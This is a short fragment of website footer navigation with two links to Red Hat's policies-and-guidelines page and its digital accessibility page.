* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)


